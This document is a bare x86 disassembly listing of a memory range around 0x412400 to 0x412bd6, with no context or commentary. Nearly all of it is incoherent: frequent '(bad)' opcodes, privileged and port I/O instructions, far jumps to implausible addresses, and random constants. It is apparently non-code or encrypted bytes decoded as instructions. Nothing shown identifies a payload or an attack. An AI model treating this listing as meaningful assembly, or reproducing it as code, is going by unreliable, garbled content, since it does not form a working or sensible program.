  4123f7:	cwde   
  4123f8:	cli    
  4123f9:	dec    esi
  4123fa:	mov    ss,eax
  4123fc:	shr    DWORD PTR [ebx],cl
  4123fe:	test   al,0x7e
  412400:	pop    ebx
  412401:	pop    esp
  412402:	fiadd  WORD PTR [ebx-0x41877318]
  412408:	inc    esp
  412409:	leave  
  41240a:	fs fwait
  41240c:	cmp    al,0x21
  41240e:	and    ah,dl
  412410:	fist   DWORD PTR [ebx-0xf245bc5]
  412416:	xor    DWORD PTR [esp+esi*1-0x4a],0xf9c252ab
  41241e:	pop    edi
  41241f:	fs xchg esi,eax
  412421:	into   
  412422:	ret    0xf20
  412425:	stos   DWORD PTR es:[edi],eax
  412426:	mov    ah,0xd2
  412428:	sbb    bh,BYTE PTR [edx+0x24]
  41242b:	test   BYTE PTR [ebx-0x3],cl
  41242e:	jne    0x41243d
  412430:	lahf   
  412431:	daa    
  412432:	jge    0x4123c2
  412434:	adc    DWORD PTR ds:0x3b26ab52,ebx
  41243a:	jno    0x769a07e4
  412440:	fucomi st,st(6)
  412442:	dec    ebx
  412443:	test   DWORD PTR [edx+0x70375fa3],ecx
  412449:	hlt    
  41244a:	mov    dl,0x47
  41244c:	adc    bh,BYTE PTR [ecx-0x560a87c3]
  412452:	fcomp  DWORD PTR [eax]
  412454:	jp     0x4123ec
  412456:	jmp    0xa1bc:0x8f55ee72
  41245d:	std    
  41245e:	pop    ss
  41245f:	pop    ds
  412460:	mov    bl,0x76
  412462:	jne    0x4124c3
  412464:	and    al,0x39
  412466:	xor    DWORD PTR ds:[edi-0x2a],edi
  41246a:	in     eax,dx
  41246b:	fstp   DWORD PTR [edx]
  41246d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41246e:	push   ds
  41246f:	cmp    eax,0x77971e13
  412474:	jb     0x4124ca
  412476:	fs and dl,ch
  412479:	sub    eax,0x1747ac59
  41247e:	cmp    ecx,DWORD PTR [eax+0x7e2a3815]
  412484:	pop    ss
  412485:	mov    ch,0x9a
  412487:	and    eax,0x5ec9c6c0
  41248c:	fs ins DWORD PTR es:[edi],dx
  41248e:	or     eax,0xb11758d8
  412493:	and    dl,bl
  412495:	in     eax,dx
  412496:	jbe    0x412443
  412498:	mov    eax,ds:0xf4382f26
  41249d:	push   0x70
  41249f:	sti    
  4124a0:	mov    bh,0x21
  4124a2:	pop    es
  4124a3:	inc    esi
  4124a4:	mov    cl,0xa5
  4124a6:	mov    BYTE PTR [esi+0x55895257],cl
  4124ac:	in     al,0xe9
  4124ae:	add    DWORD PTR [edx],0x0
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x341ebe60
  4124bf:	clc    
  4124c0:	cmp    DWORD PTR cs:0xe578786e,edi
  4124c7:	jle    0x412541
  4124c9:	js     0x41253e
  4124cb:	loope  0x41245f
  4124cd:	mov    esp,0x9eb9f475
  4124d2:	cmc    
  4124d3:	push   ebp
  4124d4:	xor    dl,BYTE PTR [eax+0x48cf6193]
  4124da:	push   0x65a76b26
  4124df:	test   eax,0x1bd6642b
  4124e4:	ret    0xb76f
  4124e7:	(bad)  
  4124e8:	int    0x5f
  4124ea:	(bad)  
  4124eb:	dec    ecx
  4124ec:	mov    dl,0x29
  4124ee:	inc    ecx
  4124ef:	cmp    DWORD PTR [edi+0x28b63084],0x6467b3b9
  4124f9:	(bad)  
  4124fa:	xlat   BYTE PTR ds:[ebx]
  4124fb:	ja     0x4124fd
  4124fd:	pop    ds
  4124fe:	jmp    0x412512
  412500:	sar    BYTE PTR [edx],0xea
  412503:	mov    edx,0x62348e9a
  412508:	xchg   edi,eax
  412509:	not    DWORD PTR [eax]
  41250b:	aad    0x6b
  41250d:	jg     0x41254d
  41250f:	pop    es
  412510:	dec    edi
  412511:	adc    bh,bl
  412513:	popf   
  412514:	ffreep st(1)
  412516:	test   al,0xda
  412518:	sbb    al,0xbf
  41251a:	pop    ebx
  41251b:	mov    DWORD PTR [ebp-0x58],ebx
  41251e:	outs   dx,BYTE PTR ds:[esi]
  41251f:	or     bh,bh
  412521:	inc    edx
  412522:	cmp    BYTE PTR [esi+ebp*1-0x64],ch
  412526:	mov    gs,esi
  412528:	mov    ecx,0xbcaafeef
  41252d:	es call 0x664c:0xcb45f36c
  412535:	(bad)  
  412536:	rcr    BYTE PTR [edx],1
  412538:	ins    DWORD PTR es:[edi],dx
  412539:	mov    ah,0x47
  41253b:	(bad)  
  41253c:	xchg   ebx,eax
  41253d:	inc    esi
  41253e:	push   0x50
  412540:	aas    
  412541:	outs   dx,DWORD PTR ds:[esi]
  412542:	ss es std 
  412545:	dec    esp
  412546:	jnp    0x4125ac
  412548:	adc    ecx,edx
  41254a:	repnz pop eax
  41254c:	cwde   
  41254d:	jmp    0xeb25ee18
  412552:	adc    al,0x45
  412554:	in     eax,0xd0
  412556:	shl    eax,cl
  412558:	es mov cl,0xe9
  41255b:	add    ch,bl
  41255d:	mov    WORD PTR [eax+eiz*1],fs
  412560:	sahf   
  412561:	mov    esp,0xacdff703
  412566:	adc    eax,0x93ddfd0b
  41256b:	sar    BYTE PTR [ebp+0x3529fd77],cl
  412571:	mov    DWORD PTR [ebp+0x139185e0],esi
  412577:	icebp  
  412578:	add    ebx,DWORD PTR [eax-0x4fc2254c]
  41257e:	icebp  
  41257f:	sbb    DWORD PTR [edi-0x5d9d1530],ebp
  412585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412586:	adc    ecx,DWORD PTR [edi]
  412588:	xor    BYTE PTR [edi+0x7f],bh
  41258b:	mov    ds:0x5071ddf7,al
  412590:	mov    esp,DWORD PTR [edi+0x5e]
  412593:	addr16 in eax,dx
  412595:	push   edx
  412596:	in     al,dx
  412597:	je     0x41258d
  412599:	jno    0x4125e9
  41259b:	dec    edx
  41259c:	cmp    BYTE PTR [esi+0x1b64c295],0xd7
  4125a3:	mov    esp,0xbf3880cf
  4125a8:	rcl    BYTE PTR [esi+0x35f4e5ec],1
  4125ae:	dec    edx
  4125af:	nop
  4125b0:	mov    cl,0x31
  4125b2:	xor    edi,eax
  4125b4:	jmp    0x4125da
  4125b6:	stos   BYTE PTR es:[edi],al
  4125b7:	sbb    al,BYTE PTR [eax-0x405ffdc3]
  4125bd:	mov    WORD PTR [ecx-0x63],?
  4125c0:	sub    BYTE PTR [edi-0x4],dh
  4125c3:	xchg   BYTE PTR [bx+0x792f],bh
  4125c8:	cmp    al,0x63
  4125ca:	cmp    BYTE PTR gs:[ecx+0xe],cl
  4125ce:	add    esi,DWORD PTR [edx]
  4125d0:	out    dx,al
  4125d1:	mov    ebp,0x4e4ce589
  4125d6:	xor    al,0xd7
  4125d8:	dec    ebx
  4125d9:	call   0x9946c505
  4125de:	ja     0x41257e
  4125e0:	mov    esi,0x1c39990e
  4125e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125e6:	and    BYTE PTR [eax-0x7cb5ca25],cl
  4125ec:	inc    ecx
  4125ed:	imul   esp,DWORD PTR [esi-0x3c],0x7
  4125f1:	pop    ebx
  4125f2:	loope  0x41259b
  4125f4:	sbb    edx,DWORD PTR [edi]
  4125f6:	push   edi
  4125f7:	mov    esp,0x857b259f
  4125fc:	mov    eax,ds:0xf4cfeb20
  412601:	cmp    al,0xe5
  412603:	jo     0x4125ec
  412605:	xchg   esi,eax
  412606:	hlt    
  412607:	xor    al,0x1f
  412609:	and    BYTE PTR [ebx+0x1eff7de0],dh
  41260f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412610:	ret    0xe952
  412613:	xlat   BYTE PTR ds:[ebx]
  412614:	clc    
  412615:	mov    BYTE PTR [eax+0x79],bl
  412618:	popf   
  412619:	ror    DWORD PTR [eax-0x4ca8a246],0xc5
  412620:	xchg   dl,bh
  412622:	mov    ebx,0x5a149842
  412627:	mov    ds:0xe29eddd3,eax
  41262c:	rcl    DWORD PTR [ebx+0x577373e8],cl
  412632:	out    dx,al
  412633:	mov    esi,0x251ca1cf
  412638:	mov    cl,0x3b
  41263a:	mov    ebx,0x86a882c3
  41263f:	mov    dl,0xd3
  412641:	jo     0x412656
  412643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412644:	outs   dx,DWORD PTR ds:[esi]
  412645:	cmp    DWORD PTR [ecx-0x7c],0x14
  412649:	adc    DWORD PTR [edi-0x35a22b44],ebp
  41264f:	mov    DWORD PTR [ecx+0x3d],esp
  412652:	push   0x29f818c1
  412657:	adc    esp,DWORD PTR [ebp+0x737c0f42]
  41265d:	in     eax,dx
  41265e:	arpl   WORD PTR [esi],ax
  412660:	retf   0xf088
  412663:	mov    ch,BYTE PTR [edi-0x2d]
  412666:	adc    al,0xce
  412668:	data16 gs in al,0x5a
  41266c:	xchg   esi,eax
  41266d:	sahf   
  41266e:	push   ebp
  41266f:	imul   esi,ecx,0xad76f9d5
  412675:	mov    cl,0x9e
  412677:	dec    esi
  412678:	push   cs
  412679:	dec    ebp
  41267a:	mov    cl,ch
  41267c:	retf   0x2725
  41267f:	mov    esp,0xbb658654
  412684:	mov    edi,0xb393e3a
  412689:	loop   0x4126e6
  41268b:	leave  
  41268c:	outs   dx,DWORD PTR ds:[esi]
  41268d:	and    bl,BYTE PTR [eax]
  41268f:	xor    al,BYTE PTR [ebp-0x6daeb166]
  412695:	lahf   
  412696:	pop    eax
  412697:	cli    
  412698:	sub    BYTE PTR [esi+0x72adb83f],dl
  41269e:	mov    eax,ds:0x7591e7b2
  4126a3:	ins    BYTE PTR es:[edi],dx
  4126a4:	bound  edi,QWORD PTR [ecx+0x40]
  4126a7:	sub    al,0x7c
  4126a9:	(bad)  
  4126aa:	fldenv [esi+edi*4-0x3bbde3b5]
  4126b1:	dec    esi
  4126b2:	js     0x4126a9
  4126b4:	pop    esp
  4126b5:	mov    cl,0x8e
  4126b7:	sbb    cl,ah
  4126b9:	fisttp WORD PTR [ecx-0xe]
  4126bc:	and    BYTE PTR [ebx+0x6b],dh
  4126bf:	f2xm1  
  4126c1:	into   
  4126c2:	push   ecx
  4126c3:	cmp    edi,edx
  4126c5:	lahf   
  4126c6:	jne    0x41269d
  4126c8:	test   bh,0x40
  4126cb:	adc    al,0x99
  4126cd:	test   al,0x45
  4126cf:	js     0x4126c9
  4126d1:	cmp    BYTE PTR [esp+ebp*1],0x9e
  4126d5:	cmp    ebp,DWORD PTR [esi]
  4126d7:	(bad)  
  4126d8:	mov    al,ds:0xdd3f36e9
  4126dd:	outs   dx,DWORD PTR ds:[esi]
  4126de:	rcl    BYTE PTR [ecx+0x32],1
  4126e1:	xchg   DWORD PTR [ebx],edx
  4126e3:	inc    DWORD PTR [edi+0x6e063e9d]
  4126e9:	xlat   BYTE PTR ds:[ebx]
  4126ea:	push   ebp
  4126eb:	xor    al,bh
  4126ed:	xchg   edi,eax
  4126ee:	std    
  4126ef:	repz push edx
  4126f1:	mov    edi,0x2559711c
  4126f6:	aas    
  4126f7:	mov    al,0xfd
  4126f9:	sti    
  4126fa:	cdq    
  4126fb:	lods   al,BYTE PTR ds:[esi]
  4126fc:	es mov ch,0x41
  4126ff:	jle    0x412699
  412701:	pop    es
  412702:	retf   0xdc5a
  412705:	xchg   ebx,eax
  412706:	xchg   esi,eax
  412707:	or     ecx,DWORD PTR [ebx+0x4560e52e]
  41270d:	test   BYTE PTR [edi],bl
  41270f:	pusha  
  412710:	and    eax,0x3daa16ed
  412715:	lock inc esi
  412717:	push   ss
  412718:	mov    dl,0x21
  41271a:	mov    bl,0xa4
  41271c:	and    eax,0xcf28ccee
  412721:	mov    edx,0xed550c6d
  412726:	mov    eax,ds:0xf5714f01
  41272b:	dec    esp
  41272c:	setnp  BYTE PTR [ebx]
  41272f:	jmp    0x4126b2
  412731:	pushf  
  412732:	retf   0x7279
  412735:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	in     al,0x19
  412756:	mov    esp,0x786caa9a
  41275b:	js     0x412742
  41275d:	jle    0x4127d7
  41275f:	js     0x412777
  412761:	je     0x4127b9
  412763:	xor    eax,0xde04cd0f
  412768:	(bad)  
  412769:	jle    0x412749
  41276b:	xor    ebx,DWORD PTR [edx+ecx*1-0x2]
  41276f:	mov    DWORD PTR [ebx+0x2052f3f6],eax
  412775:	call   edi
  412777:	add    al,0xd5
  412779:	and    DWORD PTR [eax],edi
  41277b:	mov    bh,BYTE PTR ds:0x37354d97
  412781:	dec    eax
  412782:	inc    esi
  412783:	xchg   esp,eax
  412784:	mov    edx,0x6cc749f4
  412789:	and    ch,BYTE PTR [ebx-0x1ebd67e8]
  41278f:	outs   dx,BYTE PTR ds:[esi]
  412790:	sbb    eax,0xee76b0cd
  412795:	push   ss
  412796:	js     0x41276d
  412798:	push   ebx
  412799:	push   ds
  41279a:	xor    DWORD PTR [eax+edx*4+0x13621ccb],edi
  4127a1:	aas    
  4127a2:	arpl   WORD PTR [eax-0x2b],dx
  4127a5:	retf   
  4127a6:	test   BYTE PTR [edi],0x91
  4127a9:	mov    ebx,0xfd5959e7
  4127ae:	aas    
  4127af:	and    BYTE PTR [esi+0x6f5f05b9],ch
  4127b5:	rcl    BYTE PTR [esi+0x48fb3826],1
  4127bb:	inc    edx
  4127bd:	mov    ebx,0xf46f6952
  4127c2:	xlat   BYTE PTR ds:[ebx]
  4127c3:	sbb    eax,0x5e2546fe
  4127c8:	sub    ecx,DWORD PTR [ecx-0x4dc43628]
  4127ce:	aad    0x4
  4127d0:	xchg   ecx,eax
  4127d1:	or     DWORD PTR [ebx],0x12
  4127d4:	mov    eax,0x9e7b50f
  4127d9:	jmp    0x246e853
  4127de:	adc    bh,BYTE PTR [eax+0x22]
  4127e1:	fisttp QWORD PTR [esi+0xc]
  4127e4:	mov    WORD PTR [edi-0x797db3b1],fs
  4127ea:	adc    eax,0xd172819a
  4127ef:	push   ss
  4127f0:	mov    al,BYTE PTR [edi-0x66]
  4127f3:	xchg   ebp,eax
  4127f4:	and    DWORD PTR [esi],0xe53e9f2b
  4127fa:	sbb    DWORD PTR [edx+0x63],ecx
  4127fd:	lods   eax,DWORD PTR ds:[esi]
  4127fe:	in     al,dx
  4127ff:	adc    BYTE PTR ds:0xf4306e3,0x23
  412806:	in     al,dx
  412807:	outs   dx,DWORD PTR ds:[esi]
  412808:	or     eax,DWORD PTR [ebp+0x6bfb302d]
  41280e:	push   edx
  41280f:	sbb    BYTE PTR [edi+ebp*1],ch
  412812:	push   ecx
  412813:	fwait
  412814:	clc    
  412815:	jb     0x4127a9
  412817:	(bad)  
  412818:	imul   ebx,edx,0xffffffd8
  41281b:	jae    0x4127df
  41281d:	jg     0x4127a1
  41281f:	jmp    0x130b7afd
  412824:	jbe    0x41283e
  412826:	mov    esp,0xbcc8b525
  41282b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41282c:	lea    esi,[ebp+0x5c694c1f]
  412832:	or     ebp,eax
  412834:	in     eax,0xc1
  412836:	(bad)  
  412837:	mov    esi,ebx
  412839:	sub    eax,0x6b879105
  41283e:	and    bl,cl
  412840:	dec    ecx
  412841:	and    edx,esp
  412843:	bound  edi,QWORD PTR [eax-0x6b0ea74a]
  412849:	scas   al,BYTE PTR es:[edi]
  41284a:	(bad)  
  41284b:	xor    eax,0x459993e8
  412850:	jecxz  0x41282f
  412852:	cmc    
  412853:	(bad)  
  412854:	shl    BYTE PTR ds:0x7a4b1b9b,cl
  41285a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41285b:	and    DWORD PTR ds:0xbef2f65d,ebp
  412861:	push   eax
  412862:	xor    ah,ch
  412864:	mov    ecx,0xa9dd1338
  412869:	shl    DWORD PTR [eax-0x49444904],cl
  41286f:	pop    ebp
  412870:	push   eax
  412871:	push   edi
  412872:	mov    edx,DWORD PTR [edx+ebx*8+0x7a]
  412876:	sub    al,0x83
  412878:	jnp    0x412825
  41287a:	data16 (bad) 
  41287c:	hlt    
  41287d:	dec    esi
  41287e:	sbb    DWORD PTR [esi+0x14],edi
  412881:	ins    DWORD PTR es:[edi],dx
  412882:	test   BYTE PTR [eax+0x16255747],0x2a
  412889:	jmp    0xbb06:0xab0c8533
  412890:	add    al,0xf3
  412892:	adc    dl,BYTE PTR [eax-0x13]
  412895:	stos   DWORD PTR es:[edi],eax
  412896:	adc    al,0x20
  412898:	mov    ebx,0xf8b912ad
  41289d:	xor    BYTE PTR [edi-0x11],ah
  4128a0:	sbb    al,0x8f
  4128a2:	ja     0x412831
  4128a4:	test   eax,0x9b2bedcd
  4128a9:	cmp    dl,BYTE PTR [ebp-0x3b]
  4128ac:	pop    edi
  4128ad:	or     ch,bl
  4128af:	je     0x4128af
  4128b1:	aad    0x6d
  4128b3:	dec    ecx
  4128b4:	push   eax
  4128b5:	jbe    0x4128b1
  4128b7:	popf   
  4128b8:	sbb    BYTE PTR [edx],bh
  4128ba:	xlat   BYTE PTR fs:[ebx]
  4128bc:	fadd   DWORD PTR [ebx]
  4128be:	sbb    DWORD PTR [ebx],0xb33fc9c4
  4128c4:	arpl   WORD PTR [edx],dx
  4128c6:	popf   
  4128c7:	addr16 in eax,dx
  4128c9:	mov    ds:0x7d056bc2,eax
  4128ce:	mov    esi,DWORD PTR [edx+0x696ebee9]
  4128d4:	cmc    
  4128d5:	stos   BYTE PTR es:[edi],al
  4128d6:	dec    eax
  4128d7:	and    al,0xd3
  4128d9:	lahf   
  4128da:	imul   esi,DWORD PTR [ecx-0x9b14bec],0x70
  4128e1:	sbb    ebx,esi
  4128e3:	and    al,0x8f
  4128e5:	mov    bh,0x4e
  4128e7:	out    dx,al
  4128e8:	mov    ebx,0x934e653a
  4128ed:	mov    ebx,0xab481b46
  4128f2:	mov    cl,0xae
  4128f4:	inc    BYTE PTR [edx]
  4128f6:	ins    DWORD PTR es:[edi],dx
  4128f7:	inc    esp
  4128f8:	jg     0x41293a
  4128fa:	jecxz  0x41296a
  4128fc:	sbb    dl,BYTE PTR [eax+0x34]
  4128ff:	daa    
  412900:	test   BYTE PTR [edi-0xe],bl
  412903:	inc    eax
  412904:	call   0x5be7c417
  412909:	mov    dh,0x8e
  41290b:	cmp    ebp,ebp
  41290d:	in     eax,0xf9
  41290f:	lds    esi,FWORD PTR [ecx+ebx*1-0x46]
  412913:	or     al,0xbe
  412915:	jge    0x4128f2
  412917:	inc    edi
  412918:	mov    bh,0xc6
  41291a:	lahf   
  41291b:	fucom  st(0)
  41291d:	inc    ebx
  41291e:	test   eax,0xd665d246
  412923:	adc    DWORD PTR [edx-0x1816f10c],esp
  412929:	lds    eax,FWORD PTR [edx]
  41292b:	imul   DWORD PTR [ecx+0x58]
  41292e:	cmp    BYTE PTR [eax],bl
  412930:	dec    ecx
  412931:	lahf   
  412932:	mov    eax,0x769bd7b7
  412937:	jb     0x41298f
  412939:	adc    BYTE PTR [eax+ecx*2-0x61],cl
  41293d:	in     eax,0x79
  41293f:	pop    esi
  412940:	lahf   
  412941:	sub    BYTE PTR ss:[edi+0x5d],0xa7
  412946:	(bad)  
  412947:	btc    DWORD PTR [ebx+0x20],esp
  41294b:	outs   dx,DWORD PTR ds:[esi]
  41294c:	in     eax,0x0
  41294e:	repz test ax,0xe71e
  412953:	sub    al,0xa2
  412955:	sahf   
  412956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412957:	out    dx,al
  412958:	(bad)  
  412959:	fnsave [edi+0x3a]
  41295c:	and    DWORD PTR [ebx],eax
  41295e:	into   
  41295f:	into   
  412960:	push   esi
  412961:	stos   BYTE PTR es:[edi],al
  412962:	sub    BYTE PTR [edx],0xcc
  412965:	add    eax,0x51bfca04
  41296a:	sbb    BYTE PTR [ebx+0x79d671a3],dh
  412970:	cmp    dl,BYTE PTR [esi+eax*1+0x58]
  412974:	mov    ebp,0x28f7304b
  412979:	mov    ecx,0xb3d35fed
  41297e:	inc    eax
  41297f:	lock mov bh,0x5b
  412982:	xchg   esi,eax
  412983:	dec    esi
  412984:	hlt    
  412985:	ss xor al,0x1c
  412988:	jne    0x4129e8
  41298a:	ds fwait
  41298c:	bound  esi,QWORD PTR [ebx+esi*8-0x70]
  412990:	mov    eax,ds:0x222df2a6
  412995:	ds jl  0x4129fa
  412998:	pop    esp
  412999:	mov    dl,0x37
  41299b:	mov    al,ds:0xa0b1073b
  4129a0:	(bad)  
  4129a1:	cmc    
  4129a2:	cdq    
  4129a3:	lds    esi,FWORD PTR [edi+0x5e]
  4129a6:	in     al,0xcd
  4129a8:	dec    esi
  4129a9:	inc    ebp
  4129aa:	loopne 0x4129ba
  4129ac:	cmp    eax,0x6ae662fc
  4129b1:	test   eax,0x7a4786be
  4129b6:	int3   
  4129b7:	dec    edx
  4129b8:	pop    edi
  4129b9:	mov    dl,0x2c
  4129bb:	adc    DWORD PTR [edi+0x1e],esi
  4129be:	call   0x5369244b
  4129c3:	xlat   BYTE PTR ds:[ebx]
  4129c4:	and    dl,BYTE PTR [ebx+edx*2]
  4129c7:	inc    ecx
  4129c8:	lds    ebp,FWORD PTR [ebx]
  4129ca:	mov    ecx,0x33e8558b
  4129cf:	rol    BYTE PTR [ebx],1
  4129d1:	shr    ecx,1
  4129d3:	cwde   
  4129d4:	sldt   WORD PTR [eax]
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x4129d8
  4129f1:	dec    ebp
  4129f2:	push   ds
  4129f3:	test   al,0x17
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x4129e7
  4129fd:	fnstsw WORD PTR [ebx+0x43]
  412a00:	cmc    
  412a01:	into   
  412a02:	adc    ebp,ecx
  412a04:	arpl   WORD PTR ds:0xac2ec1e7,si
  412a0a:	push   esi
  412a0b:	xchg   esi,eax
  412a0c:	adc    edx,DWORD PTR [esi+0x5c]
  412a0f:	(bad)  
  412a10:	sub    ch,al
  412a12:	iret   
  412a13:	ficomp DWORD PTR [eax]
  412a15:	pushfw 
  412a17:	ins    DWORD PTR es:[edi],dx
  412a18:	dec    edi
  412a19:	sub    DWORD PTR [eax-0x3d],edx
  412a1c:	push   edx
  412a1d:	sub    eax,0x3a879933
  412a22:	and    BYTE PTR ds:0x5e27b6a8,dl
  412a28:	dec    ebp
  412a29:	mov    dl,0x5d
  412a2b:	dec    edx
  412a2c:	pop    es
  412a2d:	and    BYTE PTR ds:0x2a7fb2e3,ch
  412a33:	in     eax,dx
  412a34:	rcr    DWORD PTR [edi+0x56],cl
  412a37:	dec    ecx
  412a38:	lods   eax,DWORD PTR ds:[esi]
  412a39:	clc    
  412a3a:	and    DWORD PTR [edx+0x6f],edx
  412a3d:	cmp    bl,BYTE PTR [ebx+0x10]
  412a40:	xor    BYTE PTR [edx+0x3d],cl
  412a43:	push   ds
  412a44:	jecxz  0x412a87
  412a46:	jmp    DWORD PTR [esi-0x538b14dd]
  412a4c:	xchg   ecx,eax
  412a4d:	popf   
  412a4e:	mov    bl,0xe2
  412a50:	jl     0x412a19
  412a52:	jecxz  0x412a64
  412a54:	push   es
  412a55:	and    eax,0x99764725
  412a5a:	repz int 0x5c
  412a5d:	push   esi
  412a5e:	lods   eax,DWORD PTR ds:[esi]
  412a5f:	aam    0xd7
  412a61:	add    DWORD PTR [eax],0xb30101a3
  412a67:	sub    cl,ah
  412a69:	add    ebx,ebp
  412a6b:	and    bl,BYTE PTR [eax]
  412a6d:	sbb    eax,0x1bfa12a9
  412a72:	lods   al,BYTE PTR ds:[esi]
  412a73:	das    
  412a74:	test   eax,0xccf83ed4
  412a79:	pop    edi
  412a7a:	or     eax,0x59f557d4
  412a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a80:	mov    bl,0x78
  412a82:	push   esi
  412a83:	mov    bh,0x69
  412a85:	sbb    ebp,DWORD PTR [edi]
  412a87:	aas    
  412a88:	sti    
  412a89:	mov    ch,0x97
  412a8b:	push   eax
  412a8c:	aam    0xab
  412a8e:	dec    eax
  412a8f:	(bad)  
  412a90:	scas   eax,DWORD PTR es:[edi]
  412a91:	loopne 0x412a20
  412a93:	out    0x3d,al
  412a95:	neg    al
  412a97:	js     0x412b0c
  412a99:	mov    ebp,DWORD PTR [eax]
  412a9b:	out    0x2d,al
  412a9d:	jae    0x412a57
  412a9f:	inc    ebp
  412aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aa1:	ja     0x412ae2
  412aa3:	mov    dh,0x86
  412aa5:	(bad)  
  412aa6:	or     cl,cl
  412aa8:	mov    al,0xa8
  412aaa:	mov    bh,0xba
  412aac:	xchg   esi,eax
  412aad:	pop    esp
  412aae:	cmp    eax,0xbed4801e
  412ab3:	test   al,0xab
  412ab5:	rcl    ebp,0x4b
  412ab8:	mov    WORD PTR [ecx-0x7b],es
  412abb:	lock jae 0x412b21
  412abe:	mov    ds:0x7ed4dd93,eax
  412ac3:	dec    ecx
  412ac4:	out    dx,al
  412ac5:	pop    esi
  412ac6:	lods   al,BYTE PTR ds:[esi]
  412ac7:	in     al,dx
  412ac8:	or     DWORD PTR [ebx+0x1bdd5a67],esp
  412ace:	imul   esi,DWORD PTR gs:[esi],0x78
  412ad2:	push   0xe7afd885
  412ad7:	dec    esi
  412ad8:	push   ebx
  412ad9:	sbb    ebx,DWORD PTR [ecx]
  412adb:	sbb    esi,DWORD PTR [ecx+0x4b]
  412ade:	dec    edi
  412adf:	enter  0xd41f,0x87
  412ae3:	loope  0x412acd
  412ae5:	mov    bl,0xd3
  412ae7:	mov    esp,0xe73e1955
  412aec:	fistp  DWORD PTR [edi-0x3f]
  412aef:	in     eax,0xa
  412af1:	inc    esp
  412af2:	or     ah,dl
  412af4:	adc    al,0x31
  412af6:	outs   dx,BYTE PTR ds:[esi]
  412af7:	push   esp
  412af8:	fwait
  412af9:	inc    edi
  412afa:	adc    al,0x53
  412afc:	in     al,dx
  412afd:	scas   al,BYTE PTR es:[edi]
  412afe:	es xor edx,eax
  412b01:	jp     0x412ad8
  412b03:	bound  esi,QWORD PTR [ecx-0x4c]
  412b06:	pop    ebp
  412b07:	dec    ebx
  412b08:	push   cs
  412b09:	and    eax,0x7dc99160
  412b0e:	mov    DWORD PTR [edx+0x7d037299],0x4ddbe01f
  412b18:	ret    0x6e68
  412b1b:	and    esi,esp
  412b1d:	clc    
  412b1e:	outs   dx,BYTE PTR ds:[esi]
  412b1f:	push   esp
  412b20:	dec    eax
  412b21:	es out dx,al
  412b23:	dec    edi
  412b24:	adc    esp,DWORD PTR [edx]
  412b26:	ret    
  412b27:	mov    bl,0x28
  412b29:	mov    DWORD PTR [eax],0xda301ae8
  412b2f:	rol    BYTE PTR [ebx-0x7e],cl
  412b32:	mov    ecx,0x3fe09318
  412b37:	popa   
  412b38:	das    
  412b39:	shl    ecx,1
  412b3b:	int    0x73
  412b3d:	lds    ebx,FWORD PTR [edi+0x5c1cc498]
  412b43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b44:	xor    edx,esi
  412b46:	cld    
  412b47:	push   edi
  412b48:	das    
  412b49:	fsubp  st(7),st
  412b4b:	sti    
  412b4c:	lahf   
  412b4d:	sbb    ebp,edx
  412b4f:	add    cl,dh
  412b51:	test   eax,0x77083dcb
  412b56:	out    0xf2,eax
  412b58:	popf   
  412b59:	cs and al,0x81
  412b5c:	retf   0xbd4d
  412b5f:	inc    edi
  412b60:	xchg   ebx,eax
  412b61:	jp     0x412aea
  412b63:	es call 0xa61:0xfcf4c6ad
  412b6b:	dec    edi
  412b6c:	xchg   esi,eax
  412b6d:	add    DWORD PTR [edi],edx
  412b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b70:	mov    ds:0x8f7c3d37,eax
  412b75:	sub    BYTE PTR [edi-0x157f27ab],al
  412b7b:	push   edx
  412b7c:	add    DWORD PTR [ebp+0x1d],eax
  412b7f:	xlat   BYTE PTR ds:[ebx]
  412b80:	nop
  412b81:	jbe    0x412b12
  412b83:	mov    WORD PTR [ecx+0x2d11bdd4],ds
  412b89:	mov    eax,0xea539e76
  412b8e:	inc    edi
  412b8f:	pop    edi
  412b90:	lods   al,BYTE PTR ds:[si]
  412b92:	cs call 0xa26b:0xfc792b8d
  412b9a:	outs   dx,DWORD PTR ds:[esi]
  412b9b:	mov    esp,0x33c0c693
  412ba0:	add    eax,DWORD PTR [ebp+0x39]
  412ba3:	mov    ch,0x98
  412ba5:	mov    bl,dh
  412ba7:	loope  0x412bed
  412ba9:	adc    ebx,DWORD PTR [esi+ecx*2+0x59]
  412bad:	sub    al,0xc4
  412baf:	mov    ebp,0x5153f5db
  412bb4:	push   ebp
  412bb5:	outs   dx,BYTE PTR ds:[esi]
  412bb6:	or     eax,0x65e078dc
  412bbb:	mov    esp,0x81037628
  412bc0:	and    al,0x56
  412bc2:	push   es
  412bc3:	js     0x412ba5
  412bc5:	stc    
  412bc6:	lock pop ds
  412bc8:	loopne 0x412c14
  412bca:	or     al,0x99
  412bcc:	push   esp
  412bcd:	sub    dl,al
  412bcf:	or     eax,0xbd3770ba
  412bd4:	cmp    al,0xdf
  412bd6:	xchg   BYTE PTR [eax-0x3ff9fa54],ch
